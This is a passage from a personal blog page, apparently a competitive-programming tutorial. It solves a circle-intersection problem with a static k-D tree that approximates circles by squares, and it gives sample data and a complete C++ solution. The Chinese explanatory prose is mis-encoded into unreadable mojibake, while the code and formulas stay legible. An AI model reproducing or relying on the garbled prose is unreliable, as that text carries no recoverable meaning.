<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">11</span><br><span class="line">9 9 2</span><br><span class="line">13 2 1</span><br><span class="line">11 8 2</span><br><span class="line">3 3 2</span><br><span class="line">3 12 1</span><br><span class="line">12 14 1</span><br><span class="line">9 8 5</span><br><span class="line">2 8 2</span><br><span class="line">5 2 1</span><br><span class="line">14 4 2</span><br><span class="line">14 14 1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 2 7 4 5 6 7 7 4 7 6</span><br></pre></td></tr></table></figure>

<p>æ ·ä¾‹è§£é‡Šï¼š</p>
<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/yrj1zyeq.png"></p>
<p>æœ‰åœ†ï¼Œä¸å¤ªå¥½å¤„ç†ï¼Œçœ‹èµ·æ¥æ— ä»ä¸‹æ‰‹ï¼Ÿ</p>
<p>æˆ‘ä»¬ä¸å¦¨æŠŠæ¯ä¸ªåœ†çœ‹æˆçŸ©å½¢ï¼ˆå³è¾¹é•¿ä¸º $2r$ çš„æ­£æ–¹å½¢ï¼‰ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“å¾—å‡ºï¼Œå¦‚æœä¸¤ä¸ªçŸ©å½¢æ²¡æœ‰äº¤é›†ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªçŸ©å½¢ä»£è¡¨çš„åœ†ä¸€å®šæ²¡æœ‰äº¤é›†ã€‚</p>
<p>é‚£ä¹ˆæ€ä¹ˆå‚¨å­˜æ¯ä¸ªåœ†çš„ä¿¡æ¯å‘¢ï¼Ÿè¿˜æ˜¯k-D Treeï¼Œè¿™æ—¶æˆ‘ä»¬æ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤çš„ä¿¡æ¯æ¯”è¾ƒå¤šã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>];<span class="comment">//åœ†çš„åæ ‡</span></span><br><span class="line">	<span class="type">int</span> r,id;<span class="comment">//åŠå¾„å’Œç¼–å·</span></span><br><span class="line">&#125;c[MAX];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	circle dat;<span class="comment">//è¯¥ç‚¹ä»£è¡¨çš„åœ†</span></span><br><span class="line">	<span class="type">int</span> mx[<span class="number">2</span>],mn[<span class="number">2</span>];<span class="comment">//è¿‘ä¼¼çŸ©å½¢</span></span><br><span class="line">	<span class="type">int</span> ls,rs;<span class="comment">//å·¦å³å„¿å­</span></span><br><span class="line">&#125;t[MAX];</span><br></pre></td></tr></table></figure>

<p>çŸ©å½¢å¾ˆå¥½ç»´æŠ¤ï¼Œåªæ˜¯å››ä¸ªé¡¶ç‚¹çš„åæ ‡å’Œä¹‹å‰æœ‰æ‰€ä¸åŒï¼Œç”¨åœ†çš„åŠå¾„å’Œåæ ‡è®¡ç®—å³å¯ã€‚</p>
<p>ç”±äºæ²¡æœ‰æ’å…¥æ“ä½œï¼Œé™æ€å»ºæ ‘å³å¯ã€‚</p>
<p>æ¥ä¸‹æ¥æ˜¯æ¯”è¾ƒå…³é”®çš„å†…å®¹ï¼Œå¦‚ä½•æŸ¥è¯¢å“ªäº›åœ†ä¸å½“å‰åœ†ç›¸äº¤ã€‚</p>
<p>é¦–å…ˆæ˜¯åˆ¤æ–­åœ†ä¸åœ†æ˜¯å¦æœ‰äº¤é›†ï¼Œæ¯”è¾ƒå¥½æ¨ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„ç»“è®ºã€‚</p>
<p>å¯¹äºä¸¤ä¸ªåœ† $A,B$ï¼Œå®ƒä»¬åœ†å¿ƒçš„è·ç¦»ä¸º $dist(A,B)&#x3D;\sqrt {(A_x-B_x)^2+(A_y-B_y)^2}$ï¼Œå¦‚æœå®ƒä»¬çš„åŠå¾„å’Œå¤§äºç­‰äºåœ†å¿ƒä¹‹é—´çš„è·ç¦»ï¼Œè¯´æ˜å®ƒä»¬ç›¸äº¤æˆ–è€…ç›¸åˆ‡ï¼Œå³æœ‰äº¤é›†ã€‚ä¸ºäº†é˜²æ­¢å‡ºç°ç²¾åº¦é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¼å­ä¸¤è¾¹å¹³æ–¹ä¸€ä¸‹ï¼Œå¾—åˆ°åˆ¤å®šå¼ï¼š</p>
<p>$(A_x-B_x)^2+(A_y-B_y)^2\leq (A_r+B_r)^2$</p>
<p>å‡è®¾æˆ‘ä»¬å½“å‰æŸ¥è¯¢åˆ°äº†k-D Treeä¸Šçš„ç‚¹ $p$ï¼Œå¦‚æœ $p$ ç®¡è¾–çš„çŸ©å½¢å’ŒæŸ¥è¯¢åœ†çš„è¿‘ä¼¼çŸ©å½¢æ²¡æœ‰äº¤é›†ï¼Œè¯´æ˜ $p$ å­æ ‘å†…çš„æ‰€æœ‰åœ†ä¸€å®šå’ŒæŸ¥è¯¢åœ†æ²¡æœ‰äº¤é›†ï¼Œç›´æ¥è¿”å›ã€‚å¦åˆ™å°±çœ‹ $p$ ç»´æŠ¤çš„åœ†å’ŒæŸ¥è¯¢åœ†æ˜¯å¦æœ‰äº¤é›†ï¼ŒåŒæ—¶ $p$ ç‚¹ç»´æŠ¤çš„åœ†æ²¡æœ‰è¢«åˆ é™¤ï¼Œé‚£å°±ç»Ÿè®¡ç­”æ¡ˆï¼Œå¹¶é€’å½’å·¦å³å­æ ‘ç»§ç»­ç»Ÿè®¡ç­”æ¡ˆã€‚</p>
<p>è‡³äºæ€ä¹ˆåˆ¤æ–­ä¸¤ä¸ªçŸ©å½¢æ˜¯å¦ç›¸äº¤ï¼Œæ¡ä»¶è¾ƒå¤šï¼Œæˆ‘ä»¬ä¸å¦¨åˆ¤æ–­ä¸¤ä¸ªçŸ©å½¢æ˜¯å¦ä¸ç›¸äº¤ï¼š</p>
<ul>
<li>å¦‚æœçŸ©å½¢ $A$ æœ€å³ç«¯å°äºçŸ©å½¢ $B$ æœ€å·¦ç«¯ï¼Œåˆ™ä¸¤ä¸ªçŸ©å½¢ä¸ç›¸äº¤ã€‚</li>
<li>å¦‚æœçŸ©å½¢ $A$ æœ€å·¦ç«¯å¤§äºçŸ©å½¢ $B$ æœ€å³ç«¯ï¼Œåˆ™ä¸¤ä¸ªçŸ©å½¢ä¸ç›¸äº¤ã€‚</li>
<li>å¦‚æœçŸ©å½¢ $A$ æœ€ä¸Šç«¯å°äºçŸ©å½¢ $B$ æœ€ä¸‹ç«¯ï¼Œåˆ™ä¸¤ä¸ªçŸ©å½¢ä¸ç›¸äº¤ã€‚</li>
<li>å¦‚æœçŸ©å½¢ $A$ æœ€ä¸‹ç«¯å¤§äºçŸ©å½¢ $B$ æœ€ä¸Šç«¯ï¼Œåˆ™ä¸¤ä¸ªçŸ©å½¢ä¸ç›¸äº¤ã€‚</li>
</ul>
<p>å®Œæ•´ä»£ç  <strong>ï¼ˆä¸è¦å¤åˆ¶å“¦ï¼‰</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">1e6</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">circle</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> r,id;</span><br><span class="line">&#125;c[MAX];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	circle dat;</span><br><span class="line">	<span class="type">int</span> mx[<span class="number">2</span>],mn[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> ls,rs;</span><br><span class="line">&#125;t[MAX];</span><br><span class="line"><span class="type">int</span> K=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> ans[MAX];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(circle a,circle b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a.d[K]&lt;b.d[K];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">recmp</span><span class="params">(circle a,circle b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a.r==b.r)<span class="keyword">return</span> a.id&lt;b.id;</span><br><span class="line">	<span class="keyword">return</span> a.r&gt;b.r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[p].mn[i]=t[p].dat.d[i]-t[p].dat.r;</span><br><span class="line">		t[p].mx[i]=t[p].dat.d[i]+t[p].dat.r;</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[p].mx[i]=<span class="built_in">max</span>(t[p].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[p].mn[i]=<span class="built_in">min</span>(t[p].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">nth_element</span>(c+l,c+mid,c+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[mid].dat=c[mid];</span><br><span class="line">	t[mid].ls=<span class="built_in">build</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[mid].rs=<span class="built_in">build</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(mid);</span><br><span class="line">	<span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">intersect</span><span class="params">(circle a,circle b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> x=a.d[<span class="number">0</span>];</span><br><span class="line">	<span class="type">int</span> y=a.d[<span class="number">1</span>];</span><br><span class="line">	<span class="type">int</span> r=a.r;</span><br><span class="line">	<span class="type">int</span> sec1=(x-b.d[<span class="number">0</span>])*(x-b.d[<span class="number">0</span>]);</span><br><span class="line">	<span class="type">int</span> sec2=(y-b.d[<span class="number">1</span>])*(y-b.d[<span class="number">1</span>]);</span><br><span class="line">	<span class="type">int</span> sec3=(r+b.r)*(r+b.r);</span><br><span class="line">	<span class="keyword">if</span>(sec1+sec2&lt;=sec3)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">dismeet</span><span class="params">(<span class="type">int</span> p,circle temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> L=temp.d[<span class="number">0</span>]-temp.r;</span><br><span class="line">	<span class="type">int</span> R=temp.d[<span class="number">0</span>]+temp.r;</span><br><span class="line">	<span class="type">int</span> U=temp.d[<span class="number">1</span>]+temp.r;</span><br><span class="line">	<span class="type">int</span> D=temp.d[<span class="number">1</span>]-temp.r;</span><br><span class="line">	<span class="keyword">if</span>(R&lt;t[p].mn[<span class="number">0</span>])<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(U&lt;t[p].mn[<span class="number">1</span>])<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(L&gt;t[p].mx[<span class="number">0</span>])<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(D&gt;t[p].mx[<span class="number">1</span>])<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p,circle temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">dismeet</span>(p,temp))<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">intersect</span>(t[p].dat,temp) &amp;&amp; !ans[t[p].dat.id])ans[t[p].dat.id]=temp.id;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">if</span>(ls)<span class="built_in">query</span>(ls,temp);</span><br><span class="line">	<span class="keyword">if</span>(rs)<span class="built_in">query</span>(rs,temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">read</span>(n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">read</span>(c[i].d[<span class="number">0</span>]),<span class="built_in">read</span>(c[i].d[<span class="number">1</span>]),<span class="built_in">read</span>(c[i].r);</span><br><span class="line">		c[i].id=i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> root=<span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">sort</span>(c+<span class="number">1</span>,c+n+<span class="number">1</span>,recmp);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="keyword">if</span>(!ans[c[i].id])<span class="built_in">query</span>(root,c[i]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å¦‚æœè¯»è€…æƒ³ç‰¢è®°è¿™ä¸ªç®—æ³•ï¼Œè¯·æœ€å¥½æŒ‰ç…§æˆ‘çš„å†™æ³•æ¥ï¼Œè®°å¿†èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œå¹¶ä¸”æ€è·¯æ¯”è¾ƒæ¸…æ™°ã€‚æ„Ÿè°¢è§‚çœ‹ã€‚</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>





</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">JasmineAura</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/JasmineAura" class="github-corner" title="åœ¨ GitHub ä¸Šå…³æ³¨æˆ‘" aria-label="åœ¨ GitHub ä¸Šå…³æ³¨æˆ‘" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
